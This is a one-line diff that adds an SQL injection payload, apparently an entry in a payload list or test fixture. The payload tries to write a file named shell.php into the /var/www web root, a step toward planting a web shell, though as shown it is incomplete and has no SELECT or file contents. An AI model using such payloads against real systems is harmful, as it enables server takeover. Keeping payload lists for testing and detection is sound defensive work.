@@ -1,0 +1,1 @@
+'; INTO OUTFILE '/var/www/shell.php'--
